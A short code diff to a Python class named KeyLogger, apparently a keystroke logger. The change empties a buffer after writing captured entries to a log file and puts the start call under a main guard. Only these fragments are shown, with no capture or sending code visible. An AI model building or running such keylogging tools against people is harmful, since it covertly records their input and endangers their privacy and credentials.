@@ -23,6 +23,7 @@ class KeyLogger:
             with open(self.__log_dir, "a") as f:
                 for i in self.__buffer:
                     f.write(i + ' ')
+                self.__buffer = []
             self.__file_in_use = False
         else:
             self.__count += 1
@@ -54,5 +55,7 @@ class KeyLogger:
             print(err)
             return str(err)
 
-a = KeyLogger()
-a.start()
+
+if __name__ == "__main__":
+    a = KeyLogger()
+    a.start()
